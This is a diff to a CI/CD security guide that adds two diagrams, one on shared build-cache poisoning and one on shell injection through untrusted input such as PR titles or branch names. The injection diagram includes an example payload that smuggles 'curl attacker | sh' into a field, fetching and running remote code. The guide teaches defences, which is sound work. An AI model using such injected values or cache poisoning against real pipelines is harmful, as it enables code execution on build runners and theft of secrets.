@@ -634,6 +634,36 @@ rather than something each team must instrument itself.
   into, a context holding secrets or deploy privileges without a trust boundary. Standardize that
   split in the paved-road pipeline so no team can accidentally opt out of it.
 
+
+### Cache poisoning attack
+
+```mermaid
+sequenceDiagram
+    participant Att as Attacker (PR)
+    participant Cache as Shared Cache
+    participant Victim as Victim Build (main)
+    Att->>Cache: Poison cache with tainted artifact (same key)
+    Note over Cache: Key collision (e.g., hash of lockfile)
+    Victim->>Cache: Restore cache (gets attacker artifact)
+    Victim->>Victim: Build with poisoned dep — no network fetch
+    Victim->>Victim: Produce tainted release artifact
+    Note over Victim,Cache: Cache isolation per branch fixes this
+```
+
+
+### Pipeline injection via untrusted input
+
+```mermaid
+flowchart TD
+    INPUT["Untrusted input<br/>PR title, branch name,<br/>issue body"] --> INTERP{"Interpolated<br/>into shell?"}
+    INTERP -->|Yes: github.event in run| INJECT["Injection:<br/>'; curl attacker | sh; #'"]
+    INTERP -->|No: via env<br/>or safe context| SAFE["Safe:<br/>input treated as data"]
+
+    INJECT --> RCE["RCE on runner<br/>to secret exfil<br/>to artifact tamper"]
+    style RCE fill:#f88,stroke:#900
+    style SAFE fill:#b6f0b6,stroke:#333
+```
+
 ## Further reading
 
 - **OWASP Top 10 CI/CD Security Risks (2022)** — especially CICD-SEC-4 (Poisoned Pipeline
